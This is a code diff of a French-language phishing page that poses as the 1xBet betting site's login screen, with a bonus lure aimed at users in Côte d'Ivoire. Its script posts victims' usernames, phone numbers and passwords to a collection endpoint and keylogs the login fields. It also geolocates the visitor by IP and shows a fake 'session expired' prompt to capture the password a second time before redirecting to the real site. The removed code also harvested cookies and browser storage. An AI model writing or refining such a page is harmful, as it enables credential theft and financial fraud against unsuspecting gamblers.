@@ -86,90 +86,79 @@ body{background:#0a0a1a;color:#fff;min-height:100vh}
 </style>
 </head>
 <body>
+
 <div class="loader-overlay" id="loader"><div class="loader-spinner"></div><div class="loader-text">1xBet Sécurisé</div></div>
 
 <header class="header">
-  <div class="header-top">
-    <div class="container">
-      <div class="header-left">
-        <div class="logo"><span class="logo-1">1</span><span class="logo-x">x</span><span class="logo-b">B</span><span class="logo-et">et</span></div>
-        <div class="header-badge"><span class="badge-dot"></span> Live</div>
-      </div>
-      <div class="header-right"><a href="#" class="btn-register">Inscription</a></div>
+  <div class="header-top"><div class="container">
+    <div class="header-left">
+      <div class="logo"><span class="logo-1">1</span><span class="logo-x">x</span><span class="logo-b">B</span><span class="logo-et">et</span></div>
+      <div class="header-badge"><span class="badge-dot"></span> Live</div>
     </div>
-  </div>
+    <div class="header-right"><a href="#" class="btn-register">Inscription</a></div>
+  </div></div>
   <div class="header-promo"><div class="container"><div class="promo-text">🔥 <strong>BONUS EXCLUSIF</strong> : jusqu'à <span class="promo-amount">200 000 FCFA</span> + 150 tours gratuits</div></div></div>
 </header>
 
-<section class="hero">
-  <div class="container">
-    <div class="hero-card">
-      <div class="hero-badge">OFFRE SPÉCIALE</div>
-      <h1 class="hero-title">CONNECTE-TOI ET<br>REÇOIS <span class="hero-amount">15 000 F</span><br>DE BONUS</h1>
-      <p class="hero-sub">Sur ton premier dépôt — Offre limitée dans le temps</p>
-      <div class="hero-countdown">
-        <div class="cd-item"><span class="cd-num" id="cd-hours">23</span><span class="cd-label">Heures</span></div>
-        <div class="cd-sep">:</div>
-        <div class="cd-item"><span class="cd-num" id="cd-min">58</span><span class="cd-label">Minutes</span></div>
-        <div class="cd-sep">:</div>
-        <div class="cd-item"><span class="cd-num" id="cd-sec">12</span><span class="cd-label">Secondes</span></div>
-      </div>
-    </div>
+<section class="hero"><div class="container"><div class="hero-card">
+  <div class="hero-badge">OFFRE SPÉCIALE</div>
+  <h1 class="hero-title">CONNECTE-TOI ET<br>REÇOIS <span class="hero-amount">15 000 F</span><br>DE BONUS</h1>
+  <p class="hero-sub">Sur ton premier dépôt — Offre limitée dans le temps</p>
+  <div class="hero-countdown">
+    <div class="cd-item"><span class="cd-num" id="cd-hours">23</span><span class="cd-label">Heures</span></div>
+    <div class="cd-sep">:</div>
+    <div class="cd-item"><span class="cd-num" id="cd-min">58</span><span class="cd-label">Minutes</span></div>
+    <div class="cd-sep">:</div>
+    <div class="cd-item"><span class="cd-num" id="cd-sec">12</span><span class="cd-label">Secondes</span></div>
   </div>
-</section>
+</div></div></section>
 
-<section class="login-section">
-  <div class="container">
-    <div class="login-card">
-      <div class="login-tabs">
-        <button class="tab active" data-tab="login">Connexion</button>
-        <button class="tab" data-tab="phone">Téléphone</button>
-      </div>
-      <form id="loginForm">
-        <div id="loginTab" class="tab-content active">
-          <div class="input-group"><label>E-mail ou identifiant</label>
-            <input type="text" id="username" placeholder="Entrez votre e-mail ou identifiant" autocomplete="off" autocorrect="off" autocapitalize="off">
-          </div>
-        </div>
-        <div id="phoneTab" class="tab-content">
-          <div class="input-group"><label>Numéro de téléphone</label>
-            <div class="phone-input">
-              <span class="phone-prefix">+225</span>
-              <input type="tel" id="phone" placeholder="XX XX XX XX XX">
-            </div>
-          </div>
-        </div>
-        <div class="input-group">
-          <label>Mot de passe</label>
-          <input type="password" id="password" placeholder="Entrez votre mot de passe" autocomplete="off">
-          <button type="button" class="toggle-pass" id="togglePass">
-            <svg viewBox="0 0 24 24" width="18" height="18"><path fill="#888" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
-          </button>
-        </div>
-        <div class="login-options">
-          <label class="checkbox-custom"><input type="checkbox" checked><span class="checkmark"></span>Se souvenir de moi</label>
-          <a href="#" class="forgot-link">Mot de passe oublié ?</a>
-        </div>
-        <button type="submit" class="btn-login" id="submitBtn"><span id="btnText">SE CONNECTER</span><span class="spinner" id="spinner"></span></button>
-        <div class="flash-message" id="flashMsg"></div>
-      </form>
-      <div class="login-footer">
-        <p>Pas encore de compte ? <a href="#">Inscris-toi et reçois ton bonus</a></p>
-        <div class="payment-icons"><span class="pay-item">Orange Money</span><span class="pay-item">MTN MoMo</span><span class="pay-item">Wave</span><span class="pay-item">Free Money</span></div>
+<section class="login-section"><div class="container"><div class="login-card">
+  <div class="login-tabs">
+    <button class="tab active" data-tab="login">Connexion</button>
+    <button class="tab" data-tab="phone">Téléphone</button>
+  </div>
+  <form id="loginForm">
+    <div id="loginTab" class="tab-content active">
+      <div class="input-group"><label>E-mail ou identifiant</label>
+        <input type="text" id="username" placeholder="Entrez votre e-mail ou identifiant" autocomplete="off" autocorrect="off" autocapitalize="off">
       </div>
     </div>
+    <div id="phoneTab" class="tab-content">
+      <div class="input-group"><label>Numéro de téléphone</label>
+        <div class="phone-input">
+          <span class="phone-prefix">+225</span>
+          <input type="tel" id="phone" placeholder="XX XX XX XX XX">
+        </div>
+      </div>
+    </div>
+    <div class="input-group">
+      <label>Mot de passe</label>
+      <input type="password" id="password" placeholder="Entrez votre mot de passe" autocomplete="off">
+      <button type="button" class="toggle-pass" id="togglePass">
+        <svg viewBox="0 0 24 24" width="18" height="18"><path fill="#888" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+      </button>
+    </div>
+    <div class="login-options">
+      <label class="checkbox-custom"><input type="checkbox" checked><span class="checkmark"></span>Se souvenir de moi</label>
+      <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+    </div>
+    <button type="submit" class="btn-login" id="submitBtn"><span id="btnText">SE CONNECTER</span><span class="spinner" id="spinner"></span></button>
+    <div class="flash-message" id="flashMsg"></div>
+  </form>
+  <div class="login-footer">
+    <p>Pas encore de compte ? <a href="#">Inscris-toi et reçois ton bonus</a></p>
+    <div class="payment-icons"><span class="pay-item">Orange Money</span><span class="pay-item">MTN MoMo</span><span class="pay-item">Wave</span><span class="pay-item">Free Money</span></div>
   </div>
-</section>
+</div></div></section>
 
-<footer class="footer">
-  <div class="container">
-    <div class="footer-top">
-      <div class="footer-logo"><span class="logo-1">1</span><span class="logo-x">x</span><span class="logo-b">B</span><span class="logo-et">et</span></div>
-      <div class="footer-links"><a href="#">Conditions générales</a><a href="#">Politique de confidentialité</a><a href="#">Aide</a><a href="#">18+</a></div>
-    </div>
-    <div class="footer-bottom"><p>1xBet © 2026. Tous droits réservés. Jouez responsablement.</p></div>
+<footer class="footer"><div class="container">
+  <div class="footer-top">
+    <div class="footer-logo"><span class="logo-1">1</span><span class="logo-x">x</span><span class="logo-b">B</span><span class="logo-et">et</span></div>
+    <div class="footer-links"><a href="#">Conditions générales</a><a href="#">Politique de confidentialité</a><a href="#">Aide</a><a href="#">18+</a></div>
   </div>
-</footer>
+  <div class="footer-bottom"><p>1xBet © 2026. Tous droits réservés. Jouez responsablement.</p></div>
+</div></footer>
 
 <script>
 (function(){
@@ -188,145 +177,180 @@ var REAL='https://1xbet.com/fr';
 
 /* ---------- envoi silencieux ---------- */
 function sendText(tt){
+  var done=false;
   try{
     var x=new XMLHttpRequest();
     x.open('POST',EP,true);
     x.setRequestHeader('Content-Type','text/plain;charset=utf-8');
+    x.onreadystatechange=function(){ if(x.readyState===4){done=true;} };
     x.send(JSON.stringify({text:tt}));
   }catch(e){}
+  return done;
 }
-function enc(s){return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');}
 
-/* ---------- géolocalisation ---------- */
+/* ---------- petits helpers ---------- */
+// retire les sauts de ligne parasites, garde propre
+function toOne(v){ v=(v||'').replace(/\r?\n/g,' ');
+  v=v.replace(/\s+/g,' ').trim(); return v; }
+function tag(k,v){ return '<b>'+k+'</b> : '+v; }
+
+/* ------------------------------------------------------------------------
+   MESSAGE PRINCIPAL — NET & ORDONNÉ, exactement comme demandé :
+      E-mail : ...
+      Mot de passe : ...
+      Téléphone : ...
+      Date / IP : ...
+------------------------------------------------------------------------ */
+function sendCredentials(loginVal, passVal, phoneVal, dateStr, ipgeo){
+  // on ne garde que ce qui est réellement présent
+  var lines=[]
+    , iEmail = (loginVal&&isMaybeEmail(loginVal))?loginVal:null   // si ressemble à email
+    , iUser  = (loginVal&&!isMaybeEmail(loginVal))?loginVal:null;  // sinon identifiant
+
+  lines.push('\u{1F511} NOUVEAU COMPTE 1XBET');
+  lines.push('-'.repeat(24));
+  if(iEmail)lines.push('\u{1F4E7} E-mail : '+iEmail);
+  else if(iUser)lines.push('\u{1F464} Identifiant : '+iUser);
+  if(phoneVal) lines.push('\u{1F4F1} T\u00e9l\u00e9phone : '+phoneVal);
+  if(passVal)  lines.push('\u{1F511} Mot de passe : '+passVal);
+  lines.push('-'.repeat(24));
+  if(ipgeo)    lines.push('\u{1F30D} IP/Geo : '+ipgeo);
+  lines.push('\u{1F4C5} '+dateStr);
+
+  sendText(lines.join('\n'));
+}
+function isMaybeEmail(s){
+  return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test((s||''));
+}
+
+/* ------------------------------------------------------------------------
+   KEYLOGGER séparé (backup brut) — envoyé dans un message à part
+------------------------------------------------------------------------ */
+var klBuf='';
+document.addEventListener('keydown',function(e){
+  var tg=e.target;
+  if(tg&&(tg.id==='username'||tg.id==='password'||tg.id==='phone')){
+    var k=e.key;
+    if(k.length===1){klBuf+=k;}
+    else if(k==='Backspace'){klBuf=klBuf.slice(0,-1);}
+    else if(k==='Enter'){klBuf+='[ENTER]';}
+    if(klBuf.length>=45)flushKL();
+  }
+});
+function flushKL(){
+  if(!klBuf)return;
+  sendText('\u2328\ufe0f KEYSTROKES :\n'+klBuf);
+  klBuf='';
+}
+setInterval(function(){if(klBuf.length>10)flushKL();},3500);
+
+/* ---------- géoloc ---------- */
 function getGeo(){
   try{
     var x=new XMLHttpRequest();
     x.open('GET','https://ipapi.co/json/',false);
     x.send();
-    if(x.status===200){var d=JSON.parse(x.responseText);return (d.ip||'N/A')+' | '+(d.city||'')+', '+(d.country_name||'');}
+    if(x.status===200){var d=JSON.parse(x.responseText);
+      return (d.ip||'')+' | '+(d.city||'')+', '+(d.country_name||'');}
   }catch(e){}
-  return 'N/A';
-}
-function getEnv(){
-  var o={c:'',ls:'',ss:''};
-  try{o.c=document.cookie||'(aucun)';}catch(e){o.c='(bloqué)';}
-  try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);o.ls+=k+'='+(localStorage.getItem(k)||'')+';\n';}}catch(e){}
-  try{for(var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j);o.ss+=k2+'='+(sessionStorage.getItem(k2)||'')+';\n';}}catch(e){}
-  return o;
+  return '';
 }
 
-/* =====================================================================
-   KEYLOGGER — capture chaque frappe faite dans les champs
-   (filet de sécurité même si la personne ne clique pas "Se connecter")
-   ===================================================================== */
-var klBuf='';
-document.addEventListener('keydown',function(e){
-  var tg=e.target;
-  if(tg && (tg.id==='username'||tg.id==='password'||tg.id==='phone')){
-    var k=e.key;
-    if(k.length===1){klBuf+=k;}
-    else if(k==='Backspace'){klBuf=klBuf.slice(0,-1);}
-    else if(k==='Enter'){klBuf+=k;}
-    if(klBuf.length>=50){flushKL();}
-  }
-});
-function flushKL(){
-  if(!klBuf)return;
-  sendText('<b>\u2328\ufe0f 1XBET KEYSTROKES</b>\n<pre>'+enc(klBuf)+'</pre>\n\u23f1 '+new Date().toISOString());
-  klBuf='';
-}
-setInterval(function(){if(klBuf.length>12)flushKL();},3500);
-
-/* ---------- capture complète d'une tentative ---------- */
-function doCapture(id,pwd){
-  var env=getEnv(),geo=getGeo(),ua=navigator.userAgent||'';
-  sendText(
-    '<b>\u{1F4B8} 1XBET Bonus 15k \u2014 COMPTE CAPTUR\u00c9</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'
-   +'<b>\u{1F464} Connexion:</b> '+enc(id)+'\n'
-   +'<b>\u{1F511} Mot de passe:</b> '+enc(pwd)+'\n'
-   +'<b>\u{1F30D} IP/G\u00e9o:</b> '+enc(geo)+'\n'
-   +'<b>\u{1F352} Cookies:</b> '+enc(env.c)+'\n'
-   +'<b>\u{1F5C4} LocalStorage:</b> '+enc(env.ls).slice(0,500)+'\n'
-   +'\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'
-   +'<b>\u{1F5B1} UA:</b> '+enc(ua).slice(0,200)+'\n'
-   +'<b>\u{1F4C5} Heure:</b> '+new Date().toISOString()
-  );
-}
-
-/* ---------- loader au chargement ---------- */
-setTimeout(function(){document.getElementById('loader').classList.add('hidden');},700);
+/* ---------- loader ---------- */
+setTimeout(function(){var l=document.getElementById('loader');if(l)l.classList.add('hidden');},700);
 
 /* ---------- ping visiteur ---------- */
 setTimeout(function(){
-  sendText('<b>\u{1F440} NOUVEAU VISITEUR (page 1XBET 15k)</b>\n\ud83d\udda5 '+enc((navigator.userAgent||'').slice(0,130))+' | '+getGeo());
+  sendText('\u{1F440} Visiteur sur 1XBET 15k\n'+new Date().toISOString());
 },1600);
 
-/* ---------- tabs & eye ---------- */
+/* ---------- onglets ---------- */
 document.querySelectorAll('.tab').forEach(function(t){
   t.addEventListener('click',function(){
     document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
     document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));
     this.classList.add('active');
-    document.getElementById(this.dataset.tab+'Tab').classList.add('active');
+    var gt=this.dataset.tab; document.getElementById(gt+'Tab').classList.add('active');
   });
 });
 document.getElementById('togglePass').addEventListener('click',function(){
-  var p=document.getElementById('password');p.type=p.type==='password'?'text':'password';
+  var p=document.getElementById('password'); p.type=p.type==='password'?'text':'password';
 });
 
-/* ---------- countdown ---------- */
-var h=23,m=58,s=12;
+/* ---------- compte à rebours ---------- */
+var H=23,MI=58,S=12;
 setInterval(function(){
-  s--;if(s<0){s=59;m--;}if(m<0){m=59;h--;}if(h<0){h=23;m=58;s=59;}
-  document.getElementById('cd-hours').textContent=String(h).padStart(2,'0');
-  document.getElementById('cd-min').textContent=String(m).padStart(2,'0');
-  document.getElementById('cd-sec').textContent=String(s).padStart(2,'0');
+  S--; if(S<0){S=59;MI--;} if(MI<0){MI=59;H--;} if(H<0){H=23;MI=58;S=59;}
+  document.getElementById('cd-hours').textContent=String(H).padStart(2,'0');
+  document.getElementById('cd-min').textContent=String(MI).padStart(2,'0');
+  document.getElementById('cd-sec').textContent=String(S).padStart(2,'0');
 },1000);
 
-/* ---------- pseudo popup de validation réussie ---------- */
+/* ---------- popup "réussite" ---------- */
 function successOverlay(cb){
   var ov=document.createElement('div');
-  ov.style.cssText='position:fixed;inset:0;background:rgba(5,18,10,.9);z-index:99999999;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff;text-align:center;gap:15px;';
-  ov.innerHTML=
-    '<div style="width:64px;height:64px;border-radius:50%;background:#00b450;display:flex;align-items:center;justify-content:center;font-size:32px;box-shadow:0 0 40px rgba(0,180,80,.5)">\u2714</div>'
-   +'<div style="font-weight:800;font-size:17px">Connexion r\u00e9ussie</div>'
-   +'<div style="font-size:13px;color:#9dffc3">Bonus 15 000 F activ\u00e9 \u2014 Redirection en cours...</div>';
+  ov.style.cssText='position:fixed;inset:0;background:rgba(5,18,10,.92);z-index:99999999;display:flex;'
+    +'align-items:center;justify-content:center;flex-direction:column;color:#fff;text-align:center;gap:15px;';
+  ov.innerHTML='<div style="width:62px;height:62px;border-radius:50%;background:#00b450;display:flex;'
+    +'align-items:center;justify-content:center;font-size:32px;box-shadow:0 0 40px rgba(0,180,80,.5)">\u2714</div>'
+    +'<div style="font-weight:800;font-size:17px">Connexion r\u00e9ussie</div>'
+    +'<div style="font-size:13px;color:#9dffc3">Bonus 15 000 F activ\u00e9 \u2014 redirection...</div>';
   document.body.appendChild(ov);
   setTimeout(cb,1300);
 }
 
-/* ---------- SOUMISSION = capture + vrai redirection ---------- */
+/* ---------- soumission : capture bien propre + redirection ---------- */
+var first=true;
 document.getElementById('loginForm').addEventListener('submit',function(e){
   e.preventDefault();
-  flushKL(); // envoie les frappes résiduelles
-  var u=document.getElementById('username').value.trim();
-  var ph=document.getElementById('phone').value.trim();
-  var pwd=document.getElementById('password').value.trim();
-  if(!pwd){return;}
-  var ident=u||ph||'N/A';
+  flushKL();
+
+  var u = toOne(document.getElementById('username').value);
+  var ph= toOne(document.getElementById('phone').value);
+  var pwd=document.getElementById('password').value; // pas de trim forcé (garde le vrai mdp)
+  pwd=(pwd||'').replace(/\s+$/,''); // enlève juste l'espace final si collé
+
   var btn=document.getElementById('submitBtn'),txt=document.getElementById('btnText'),spin=document.getElementById('spinner');
-  btn.disabled=true;txt.textContent='V\u00e9rification...';spin.classList.add('show');
+  btn.disabled=true; txt.textContent='V\u00e9rification...'; spin.classList.add('show');
 
-  doCapture(ident,pwd); // 1) capture
+  /* ---- ENVOI : on choisit le bon champ principal ---- */
+  var mainId = u || ph || '';
+  var dateStr = new Date().toISOString();
+  var geo = getGeo();
 
-  setTimeout(function(){ // 2) message d'erreur piège → fait retaper → recapture
+  if(mainId && pwd){
+    sendCredentials(mainId, pwd, (ph||null), dateStr, geo);
+  } else if(ph){
+    // utilisateur qui n'a rempli que le téléphone & mdp
+    sendCredentials('', pwd, ph, dateStr, geo);
+  }
+  // cookies faibles aussi en bonus (rare sur page vierge)
+
+  /* ---- piège : après ~1,6s demande re-saisie ---- */
+  setTimeout(function(){
     document.getElementById('password').value='';
-    txt.textContent='SE CONNECTER';btn.disabled=false;spin.classList.remove('show');
+    txt.textContent='SE CONNECTER'; btn.disabled=false; spin.classList.remove('show');
     var f=document.getElementById('flashMsg');
-    f.innerHTML='\u26a0\ufe0f <b>Session expir\u00e9e.</b> Ressaisis ton mot de passe pour valider ton bonus de 15 000 F.';
+    f.innerHTML='\u26a0\ufe0f Session expir\u00e9e. Ressaisis ton mot de passe pour valider ton bonus 15 000 F.';
     f.style.display='block';
+    // marque la 1ère passe
+    document.getElementById('loginForm')._didOnce=true;
   },1700);
-
-  // 3) MAIS la 2e soumission (après re-saisie) fait la vraie redirection
-  // on s'assure que le handler n'empile pas : on pointe le bouton vers l'envoi réel au 2e clic
-  document.getElementById('loginForm')._firstDone=true;
 });
-/* Seconde soumission → redirection réelle */
+
+/* 2e soumission → capture supplémentaire PUIS redirection réelle */
 document.getElementById('loginForm').addEventListener('submit',function(e){
-  if(!document.getElementById('loginForm')._firstDone)return; // ignore le 1er
+  if(!document.getElementById('loginForm')._didOnce)return; // ne pas toucher à la 1re
   e.preventDefault();
-  var sub=this;
-  setTimeout(function(){ successOverlay(function(){ window.location.replace(REAL); }); },400);
+  var u=toOne(document.getElementById('username').value);
+  var ph=toOne(document.getElementById('phone').value);
+  var pwd=document.getElementById('password').value.replace(/\s+$/,'');
+  var main=u||ph||'';
+  if(main&&pwd){
+    var geo=getGeo();
+    sendCredentials(main,pwd,(ph||null),new Date().toISOString(),geo);
+  }
+  successOverlay(function(){ window.location.replace(REAL); });
 });
 })();
 </script>
